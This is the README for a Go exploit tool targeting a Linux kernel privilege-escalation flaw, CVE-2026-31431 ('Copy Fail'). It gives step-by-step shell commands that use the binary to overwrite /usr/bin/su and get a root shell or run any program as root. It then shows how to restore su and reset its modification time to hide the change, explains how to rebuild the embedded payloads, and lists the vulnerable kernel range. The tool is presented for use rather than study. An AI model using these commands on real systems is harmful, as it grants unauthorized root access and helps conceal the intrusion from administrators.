# CopyFail Go

> Most Linux LPEs need a race window or a kernel-specific offset. Copy Fail is a straight-line logic flaw — it needs neither. The same ~~732-byte Python script~~ static Go binary roots every Linux distribution shipped since 2017.

A Go implementation of CVE-2026-31431. In case you need a static binary and no Python dependency.

See [copy.fail](https://copy.fail) for more info.

## Interactive shell

```shell
# Get the binary to your Linux host with code execution (exercise for the reader)
user@host$ chmod +x copyfail-go
user@host$ ./copyfail-go --backup /tmp/su
root@host# cat /tmp/su > /usr/bin/su    # Restore the original su binary
root@host# touch -r /tmp/su /usr/bin/su # Restore the modified time of the original su
root@host# rm /tmp/su
root@host# # Do things as root =)
```

## Run binary as root

Useful to elevate a program to root

```shell
# Get the binary to your Linux host with code execution (exercise for the reader)
user@host$ chmod +x copyfail-go
user@host$ ./copyfail-go --backup /tmp/su --exec ./your-binary
user@host$ # Use whatever you ran to restore su from /tmp/su
```

## Don't trust those hex blobs?

Compile the payloads yourself with `payloads/build-n-print.sh` on a Debian host (Debian 13 tested).

You'll need to `apt install nasm python3 binutils-aarch64-linux-gnu binutils-arm-linux-gnueabihf` then run the script from in the payloads directory. It will compile each payload and output the zlib compressed hex strings. Compare those to what is in `main.go` (or replace them with your own) and build the `copyfile-go` binaries with `goreleaser build --snapshot --clean` from the main project directory.

## Affected kernels (from [copy-fail-c](https://github.com/tgies/copy-fail-c/tree/main#affected-kernels))

```
floor:    torvalds/linux 72548b093ee3   August 2017, v4.14
                                        (AF_ALG iov_iter rework that
                                         introduced the file-page write
                                         primitive via splice into the AEAD
                                         scatterlist)

ceiling:  torvalds/linux a664bf3d603d   April 2026, mainline
                                        (reverts the 2017 algif_aead
                                         in-place optimization; separates
                                         source and destination scatterlists
                                         so page-cache pages can no longer
                                         be a writable crypto destination)
```

In between: every major distro kernel that didn't backport the fix.
Ubuntu, RHEL, SUSE, Amazon Linux, and Debian were all confirmed vulnerable
in their stock cloud-image kernels at disclosure time. Distro-level
backports started rolling out around 2026-04-29 alongside the public
disclosure. To verify whether a target kernel is in-window, check whether
`a664bf3d603d` (or its distro-specific backport) is present in the kernel's
git log or the distro's changelog.
